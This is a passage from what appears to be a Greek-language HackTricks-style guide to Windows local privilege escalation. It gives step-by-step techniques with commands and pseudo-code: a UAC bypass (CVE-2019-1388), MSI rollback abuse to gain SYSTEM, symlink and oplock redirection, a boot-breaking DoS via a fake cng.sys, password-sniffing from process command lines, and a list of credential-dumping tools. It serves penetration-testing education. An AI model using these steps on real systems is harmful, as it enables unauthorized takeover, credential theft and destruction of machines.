- Προσθέστε τον εαυτό σας στο `[TapiAdministrators]` στο `C:\Windows\TAPI\tsec.ini`, επανασυνδεθείτε και καλέστε το `GetUIDllName` με μια αυθαίρετη διαδρομή DLL, ώστε να εκτελέσετε το `TSPI_providerUIIdentify` ως `NETWORK SERVICE`.

Περισσότερες λεπτομέρειες:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Διάφορα

### Επεκτάσεις αρχείων που μπορούν να εκτελέσουν εντολές στα Windows

Δείτε τη σελίδα **[https://filesec.io/](https://filesec.io/)**

### Κατάχρηση Protocol handler / ShellExecute μέσω Markdown renderers

Τα clickable Markdown links που προωθούνται στο `ShellExecuteExW` μπορούν να ενεργοποιήσουν επικίνδυνους URI handlers (`file:`, `ms-appinstaller:` ή οποιοδήποτε καταχωρισμένο scheme) και να εκτελέσουν αρχεία που ελέγχονται από τον attacker ως ο τρέχων χρήστης. Δείτε:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Παρακολούθηση Command Lines για passwords**

Κατά την απόκτηση ενός shell ως χρήστης, ενδέχεται να εκτελούνται scheduled tasks ή άλλες διεργασίες που **περνούν credentials στη command line**. Το παρακάτω script καταγράφει τις command lines των διεργασιών κάθε δύο δευτερόλεπτα και συγκρίνει την τρέχουσα κατάσταση με την προηγούμενη, εμφανίζοντας τυχόν διαφορές.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Κλοπή κωδικών πρόσβασης από processes

## Από Low Priv User σε NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Εάν έχετε πρόσβαση στο graphical interface (μέσω console ή RDP) και το UAC είναι ενεργοποιημένο, σε ορισμένες εκδόσεις των Microsoft Windows είναι δυνατό να εκτελέσετε ένα terminal ή οποιοδήποτε άλλο process ως "NT\AUTHORITY SYSTEM" από έναν unprivileged user.

Αυτό καθιστά δυνατή την κλιμάκωση προνομίων και την ταυτόχρονη παράκαμψη του UAC με την ίδια ευπάθεια. Επιπλέον, δεν χρειάζεται να εγκαταστήσετε τίποτα, ενώ το binary που χρησιμοποιείται κατά τη διαδικασία είναι υπογεγραμμένο και εκδοθέν από τη Microsoft.

Ορισμένα από τα επηρεαζόμενα συστήματα είναι τα εξής:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Για την εκμετάλλευση αυτής της ευπάθειας, είναι απαραίτητο να εκτελεστούν τα ακόλουθα βήματα:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Από Administrator Medium σε High Integrity Level / UAC Bypass

Διαβάστε αυτό για να **μάθετε σχετικά με τα Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Στη συνέχεια **διαβάστε αυτό για να μάθετε σχετικά με τα UAC και τα UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Από Arbitrary Folder Delete/Move/Rename σε SYSTEM EoP

Η τεχνική που περιγράφεται [**σε αυτήν την ανάρτηση blog**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), με exploit code [**διαθέσιμο εδώ**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Η επίθεση βασίζεται στην κατάχρηση της δυνατότητας rollback του Windows Installer, ώστε να αντικαθίστανται νόμιμα αρχεία με malicious αρχεία κατά τη διάρκεια της διαδικασίας απεγκατάστασης. Για αυτό, ο attacker χρειάζεται να δημιουργήσει έναν **malicious MSI installer**, ο οποίος θα χρησιμοποιηθεί για το hijack του φακέλου `C:\Config.Msi`, που αργότερα θα χρησιμοποιηθεί από το Windows Installer για την αποθήκευση rollback αρχείων κατά την απεγκατάσταση άλλων MSI packages, όπου τα rollback αρχεία θα έχουν τροποποιηθεί ώστε να περιέχουν το malicious payload.

Η συνοπτική τεχνική είναι η εξής:

1. **Stage 1 – Προετοιμασία για το Hijack (αφήστε το `C:\Config.Msi` κενό)**

- Βήμα 1: Εγκατάσταση του MSI
- Δημιουργήστε ένα `.msi` που εγκαθιστά ένα harmless αρχείο (π.χ. `dummy.txt`) σε έναν writable φάκελο (`TARGETDIR`).
- Χαρακτηρίστε τον installer ως **"UAC Compliant"**, ώστε ένας **non-admin user** να μπορεί να τον εκτελέσει.
- Διατηρήστε ένα **handle** ανοιχτό στο αρχείο μετά την εγκατάσταση.

- Βήμα 2: Έναρξη της απεγκατάστασης
- Απεγκαταστήστε το ίδιο `.msi`.
- Η διαδικασία απεγκατάστασης ξεκινά να μετακινεί αρχεία στο `C:\Config.Msi` και να τα μετονομάζει σε αρχεία `.rbf` (rollback backups).
- Κάντε **poll στο ανοιχτό file handle** χρησιμοποιώντας το `GetFinalPathNameByHandle`, για να εντοπίσετε πότε το αρχείο γίνεται `C:\Config.Msi\<random>.rbf`.

- Βήμα 3: Custom συγχρονισμός
- Το `.msi` περιλαμβάνει ένα **custom uninstall action (`SyncOnRbfWritten`)** που:
- Σηματοδοτεί πότε έχει γραφτεί το `.rbf`.
- Στη συνέχεια **περιμένει** ένα άλλο event πριν συνεχίσει η απεγκατάσταση.

- Βήμα 4: Αποκλεισμός της διαγραφής του `.rbf`
- Όταν λάβετε το σήμα, **ανοίξτε το αρχείο `.rbf`** χωρίς `FILE_SHARE_DELETE` — αυτό **εμποδίζει τη διαγραφή του**.
- Στη συνέχεια **στείλτε σήμα πίσω**, ώστε να ολοκληρωθεί η απεγκατάσταση.
- Ο Windows Installer αποτυγχάνει να διαγράψει το `.rbf` και, επειδή δεν μπορεί να διαγράψει όλα τα περιεχόμενα, το `C:\Config.Msi` **δεν αφαιρείται**.

- Βήμα 5: Χειροκίνητη διαγραφή του `.rbf`
- Εσείς (ο attacker) διαγράφετε χειροκίνητα το αρχείο `.rbf`.
- Τώρα το `C:\Config.Msi` είναι κενό και έτοιμο να γίνει hijack.

> Σε αυτό το σημείο, **ενεργοποιήστε το SYSTEM-level arbitrary folder delete vulnerability** για να διαγράψετε το `C:\Config.Msi`.

2. **Stage 2 – Αντικατάσταση των Rollback Scripts με Malicious Scripts**

- Βήμα 6: Επαναδημιουργία του `C:\Config.Msi` με Weak ACLs
- Δημιουργήστε ξανά μόνοι σας τον φάκελο `C:\Config.Msi`.
- Ορίστε **weak DACLs** (π.χ. Everyone:F) και **διατηρήστε ένα handle ανοιχτό** με `WRITE_DAC`.

- Βήμα 7: Εκτέλεση νέας εγκατάστασης
- Εγκαταστήστε ξανά το `.msi`, με:
- `TARGETDIR`: Writable τοποθεσία.
- `ERROROUT`: Μια μεταβλητή που ενεργοποιεί ένα forced failure.
- Αυτή η εγκατάσταση θα χρησιμοποιηθεί για να ενεργοποιήσει ξανά το **rollback**, το οποίο διαβάζει τα `.rbs` και `.rbf`.

- Βήμα 8: Παρακολούθηση για `.rbs`
- Χρησιμοποιήστε το `ReadDirectoryChangesW` για να παρακολουθείτε το `C:\Config.Msi` μέχρι να εμφανιστεί ένα νέο `.rbs`.
- Καταγράψτε το filename του.

- Βήμα 9: Συγχρονισμός πριν από το Rollback
- Το `.msi` περιέχει ένα **custom install action (`SyncBeforeRollback`)** που:
- Σηματοδοτεί ένα event όταν δημιουργηθεί το `.rbs`.
- Στη συνέχεια **περιμένει** πριν συνεχίσει.

- Βήμα 10: Επαναφορά των Weak ACLs
- Αφού λάβετε το event `.rbs created`:
- Ο Windows Installer **εφαρμόζει ξανά strong ACLs** στο `C:\Config.Msi`.
- Όμως, επειδή εξακολουθείτε να έχετε ένα handle με `WRITE_DAC`, μπορείτε να **εφαρμόσετε ξανά τα weak ACLs**.

> Τα ACLs **επιβάλλονται μόνο κατά το άνοιγμα του handle**, επομένως μπορείτε ακόμη να γράψετε στον φάκελο.

- Βήμα 11: Τοποθέτηση Fake `.rbs` και `.rbf`
- Αντικαταστήστε το αρχείο `.rbs` με ένα **fake rollback script** που ενημερώνει τα Windows να:
- Επαναφέρουν το αρχείο `.rbf` (malicious DLL) σε μια **privileged τοποθεσία** (π.χ. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Τοποθετήστε το fake `.rbf` που περιέχει ένα **malicious SYSTEM-level payload DLL**.

- Βήμα 12: Ενεργοποίηση του Rollback
- Στείλτε σήμα στο sync event, ώστε ο installer να συνεχίσει.
- Ένα **type 19 custom action (`ErrorOut`)** έχει ρυθμιστεί ώστε να **αποτυγχάνει σκόπιμα η εγκατάσταση** σε ένα γνωστό σημείο.
- Αυτό προκαλεί την έναρξη του **rollback**.

- Βήμα 13: Το SYSTEM εγκαθιστά το DLL σας
- Ο Windows Installer:
- Διαβάζει το malicious `.rbs` σας.
- Αντιγράφει το `.rbf` DLL σας στην τοποθεσία-στόχο.
- Τώρα έχετε το **malicious DLL σας σε μια διαδρομή που φορτώνεται από το SYSTEM**.

- Τελικό βήμα: Εκτέλεση SYSTEM Code
- Εκτελέστε ένα trusted **auto-elevated binary** (π.χ. `osk.exe`) που φορτώνει το DLL του οποίου κάνατε hijack.
- **Boom**: Ο κώδικάς σας εκτελείται **ως SYSTEM**.


### Από Arbitrary File Delete/Move/Rename σε SYSTEM EoP

Η βασική τεχνική MSI rollback (η προηγούμενη) προϋποθέτει ότι μπορείτε να διαγράψετε **έναν ολόκληρο φάκελο** (π.χ. `C:\Config.Msi`). Αλλά τι γίνεται αν η vulnerability σας επιτρέπει μόνο **arbitrary file deletion**;

Θα μπορούσατε να εκμεταλλευτείτε τα **NTFS internals**: κάθε φάκελος διαθέτει ένα hidden alternate data stream που ονομάζεται:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Αυτό το stream αποθηκεύει τα **μεταδεδομένα ευρετηρίου** του φακέλου.

Επομένως, αν **διαγράψετε το stream `::$INDEX_ALLOCATION`** ενός φακέλου, το NTFS **αφαιρεί ολόκληρο τον φάκελο** από το filesystem.

Μπορείτε να το κάνετε χρησιμοποιώντας τυπικά API διαγραφής αρχείων, όπως:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Παρόλο που καλείτε ένα API διαγραφής *file*, **διαγράφει τον ίδιο τον φάκελο**.

### Από τη διαγραφή περιεχομένων φακέλου σε SYSTEM EoP
Τι γίνεται αν το primitive σας δεν σας επιτρέπει να διαγράψετε αυθαίρετα αρχεία/φακέλους, αλλά **επιτρέπει τη διαγραφή των *περιεχομένων* ενός φακέλου που ελέγχεται από τον attacker**;

1. Βήμα 1: Ρυθμίστε έναν bait φάκελο και ένα αρχείο
- Δημιουργήστε: `C:\temp\folder1`
- Μέσα σε αυτόν: `C:\temp\folder1\file1.txt`

2. Βήμα 2: Τοποθετήστε ένα **oplock** στο `file1.txt`
- Το oplock **παγώνει την εκτέλεση** όταν μια privileged διεργασία προσπαθεί να διαγράψει το `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Βήμα 3: Ενεργοποίηση διεργασίας SYSTEM (π.χ. `SilentCleanup`)
- Αυτή η διεργασία σαρώνει φακέλους (π.χ. `%TEMP%`) και προσπαθεί να διαγράψει τα περιεχόμενά τους.
- Όταν φτάσει στο `file1.txt`, ενεργοποιείται το **oplock** και παραδίδει τον έλεγχο στο callback σας.

4. Βήμα 4: Μέσα στο callback του oplock – ανακατεύθυνση της διαγραφής

- Επιλογή A: Μετακίνηση του `file1.txt` αλλού
- Αυτό αδειάζει το `folder1` χωρίς να διακοπεί το oplock.
- Μην διαγράψετε απευθείας το `file1.txt` — αυτό θα απελευθέρωνε πρόωρα το oplock.

- Επιλογή B: Μετατροπή του `folder1` σε **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Επιλογή C: Δημιουργία ενός **symlink** στο `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Αυτό στοχεύει το εσωτερικό stream του NTFS που αποθηκεύει metadata φακέλων — η διαγραφή του διαγράφει τον φάκελο.

5. Βήμα 5: Απελευθέρωση του oplock
- Η διεργασία SYSTEM συνεχίζει και προσπαθεί να διαγράψει το `file1.txt`.
- Όμως τώρα, λόγω του junction + symlink, στην πραγματικότητα διαγράφει:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Αποτέλεσμα**: `C:\Config.Msi` διαγράφεται από το SYSTEM.

### Από τη δημιουργία αυθαίρετου φακέλου σε μόνιμο DoS

Εκμεταλλευτείτε ένα primitive που σας επιτρέπει να **δημιουργήσετε έναν αυθαίρετο φάκελο ως SYSTEM/admin** — ακόμη κι αν **δεν μπορείτε να γράψετε αρχεία** ή να **ορίσετε αδύναμα δικαιώματα**.

Δημιουργήστε έναν **φάκελο** (όχι αρχείο) με το όνομα ενός **κρίσιμου Windows driver**, π.χ.:
```
C:\Windows\System32\cng.sys
```
- Αυτή η διαδρομή αντιστοιχεί κανονικά στον kernel-mode driver `cng.sys`.
- Αν την **προδημιουργήσετε ως φάκελο**, τα Windows δεν μπορούν να φορτώσουν τον πραγματικό driver κατά την εκκίνηση.
- Έπειτα, τα Windows προσπαθούν να φορτώσουν το `cng.sys` κατά την εκκίνηση.
- Εντοπίζουν τον φάκελο, **αποτυγχάνουν να επιλύσουν τον πραγματικό driver** και **καταρρέουν ή διακόπτουν την εκκίνηση**.
- Δεν υπάρχει **fallback** ούτε **recovery** χωρίς εξωτερική παρέμβαση (π.χ. boot repair ή πρόσβαση στον δίσκο).

### Από privileged log/backup paths + OM symlinks σε arbitrary file overwrite / boot DoS

Όταν ένα **privileged service** γράφει logs/exports σε μια διαδρομή που διαβάζεται από ένα **writable config**, ανακατευθύνετε αυτή τη διαδρομή με **Object Manager symlinks + NTFS mount points**, ώστε να μετατρέψετε το privileged write σε arbitrary overwrite (ακόμη και **χωρίς SeCreateSymbolicLinkPrivilege**).

**Απαιτήσεις**
- Το config που αποθηκεύει τη διαδρομή-στόχο είναι writable από τον attacker (π.χ. `%ProgramData%\...\.ini`).
- Δυνατότητα δημιουργίας mount point προς το `\RPC Control` και OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Μια privileged operation που γράφει σε αυτή τη διαδρομή (log, export, report).

**Παράδειγμα chain**
1. Διαβάστε το config για να ανακτήσετε τον privileged log destination, π.χ. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` στο `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Ανακατευθύνετε τη διαδρομή χωρίς admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Περιμένετε το privileged component να γράψει στο log (π.χ. ο admin ενεργοποιεί το "send test SMS"). Η εγγραφή καταλήγει πλέον στο `C:\Windows\System32\cng.sys`.
4. Ελέγξτε το overwritten target (hex/PE parser) για να επιβεβαιώσετε την corruption· το reboot αναγκάζει τα Windows να φορτώσουν το tampered driver path → **boot loop DoS**. Αυτό γενικεύεται επίσης σε οποιοδήποτε protected file πρόκειται να ανοίξει για εγγραφή μια privileged service.

> Το `cng.sys` φορτώνεται κανονικά από το `C:\Windows\System32\drivers\cng.sys`, αλλά αν υπάρχει αντίγραφο στο `C:\Windows\System32\cng.sys`, μπορεί να γίνει πρώτα απόπειρα φόρτωσής του, καθιστώντας το reliable DoS sink για corrupt data.



## **Από High Integrity σε System**

### **Νέα υπηρεσία**

Αν εκτελείτε ήδη μια διεργασία High Integrity, το **path to SYSTEM** μπορεί να είναι εύκολο, απλώς **δημιουργώντας και εκτελώντας μια νέα υπηρεσία**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Κατά τη δημιουργία ενός service binary, βεβαιωθείτε ότι είναι έγκυρο service ή ότι το binary εκτελεί τις απαραίτητες ενέργειες αρκετά γρήγορα, καθώς θα τερματιστεί σε 20s αν δεν είναι έγκυρο service.

### AlwaysInstallElevated

Από μια διεργασία High Integrity μπορείτε να δοκιμάσετε να **ενεργοποιήσετε τα AlwaysInstallElevated registry entries** και να **εγκαταστήσετε** ένα reverse shell χρησιμοποιώντας ένα _**.msi**_ wrapper.\
[Περισσότερες πληροφορίες σχετικά με τα registry keys και τον τρόπο εγκατάστασης ενός _.msi_ package εδώ.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Μπορείτε να** [**βρείτε τον κώδικα εδώ**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Αν διαθέτετε αυτά τα token privileges (πιθανότατα θα τα βρείτε σε μια ήδη High Integrity διεργασία), θα μπορείτε να **ανοίξετε σχεδόν οποιαδήποτε διεργασία** (εκτός από protected processes) με το SeDebug privilege, να **αντιγράψετε το token** της διεργασίας και να δημιουργήσετε μια **arbitrary διεργασία με αυτό το token**.\
Με αυτή την τεχνική συνήθως **επιλέγεται οποιαδήποτε διεργασία εκτελείται ως SYSTEM με όλα τα token privileges** (_ναι, μπορείτε να βρείτε SYSTEM διεργασίες χωρίς όλα τα token privileges_).\
**Μπορείτε να βρείτε ένα** [**παράδειγμα κώδικα που εκτελεί την προτεινόμενη τεχνική εδώ**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Αυτή η τεχνική χρησιμοποιείται από το meterpreter για privilege escalation στο `getsystem`. Η τεχνική αποτελείται από τη **δημιουργία ενός pipe και στη συνέχεια τη δημιουργία/κατάχρηση ενός service για εγγραφή σε αυτό το pipe**. Έπειτα, ο **server** που δημιούργησε το pipe χρησιμοποιώντας το **`SeImpersonate`** privilege θα μπορεί να **κάνει impersonate το token** του pipe client (του service), αποκτώντας SYSTEM privileges.\
Αν θέλετε να [**μάθετε περισσότερα για τα name pipes, πρέπει να διαβάσετε αυτό**](#named-pipe-client-impersonation).\
Αν θέλετε να διαβάσετε ένα παράδειγμα για το [**πώς να μεταβείτε από high integrity σε System χρησιμοποιώντας name pipes, πρέπει να διαβάσετε αυτό**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Αν καταφέρετε να **κάνετε hijack ένα dll** που **φορτώνεται** από μια **διεργασία** η οποία εκτελείται ως **SYSTEM**, θα μπορείτε να εκτελέσετε arbitrary code με αυτά τα permissions. Επομένως, το Dll Hijacking είναι επίσης χρήσιμο για αυτού του είδους το privilege escalation και, επιπλέον, είναι **πολύ πιο εύκολο να επιτευχθεί από μια high integrity διεργασία**, καθώς αυτή θα έχει **write permissions** στους φακέλους που χρησιμοποιούνται για τη φόρτωση dlls.\
**Μπορείτε να** [**μάθετε περισσότερα για το Dll hijacking εδώ**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Διαβάστε:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Περισσότερη βοήθεια

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Χρήσιμα εργαλεία

**Καλύτερο εργαλείο για την αναζήτηση Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Έλεγχος για misconfigurations και sensitive files (**[**ελέγξτε εδώ**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Έλεγχος για πιθανές misconfigurations και συλλογή πληροφοριών (**[**ελέγξτε εδώ**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Έλεγχος για misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Εξάγει αποθηκευμένες πληροφορίες sessions των PuTTY, WinSCP, SuperPuTTY, FileZilla και RDP. Χρησιμοποιήστε το -Thorough σε local περιβάλλον.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Εξάγει crendentials από το Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Κάνει spray των passwords που συλλέχθηκαν σε ολόκληρο το domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Το Inveigh είναι ένα PowerShell ADIDNS/LLMNR/mDNS spoofer και man-in-the-middle tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Αναζήτηση για γνωστά privesc vulnerabilities (DEPRECATED για το Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Απαιτούνται Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Αναζήτηση για γνωστά privesc vulnerabilities (χρειάζεται compile με χρήση VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Κάνει enumeration στο host αναζητώντας misconfigurations (περισσότερο gather info tool παρά privesc) (χρειάζεται compile) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Εξάγει credentials από πολλά software (precompiled exe στο github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port του PowerUp σε C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Έλεγχος για misconfiguration (precompiled executable στο github). Δεν συνιστάται. Δεν λειτουργεί σωστά σε Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Έλεγχος για πιθανές misconfigurations (exe από python). Δεν συνιστάται. Δεν λειτουργεί σωστά σε Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool που δημιουργήθηκε με βάση αυτό το post (δεν χρειάζεται accesschk για να λειτουργήσει σωστά, αλλά μπορεί να το χρησιμοποιήσει).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Διαβάζει το output του **systeminfo** και προτείνει working exploits (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Διαβάζει το output του **systeminfo** και προτείνει working exploits (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Πρέπει να κάνετε compile το project χρησιμοποιώντας τη σωστή έκδοση του .NET ([δείτε αυτό](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Για να δείτε την εγκατεστημένη έκδοση του .NET στο victim host, μπορείτε να εκτελέσετε:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Αναφορές

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: ηλεκτρονικό ψάρεμα μέσω Word VBA macro μέσω SMTP → αποκρυπτογράφηση διαπιστευτηρίων hMailServer → Veeam CVE-2023-27532 σε SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) και κλοπή kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Καταδιώκοντας την Silver Fox: γάτα και ποντίκι στις σκιές του kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Ευπάθεια προνομιακού file system σε σύστημα SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Εργαλεία δοκιμών συμβολικών συνδέσμων – χρήση του CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [Ένας σύνδεσμος από το παρελθόν. Κατάχρηση συμβολικών συνδέσμων στα Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (μεταφορά Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: επικίνδυνη επίλυση module στα Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: φόρτωση από φακέλους `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Trail of Bits - προκλήσεις checklist C/C++, λυμένες](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [Microsoft Learn - συνάρτηση RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)

{{#include ../../banners/hacktricks-training.md}}
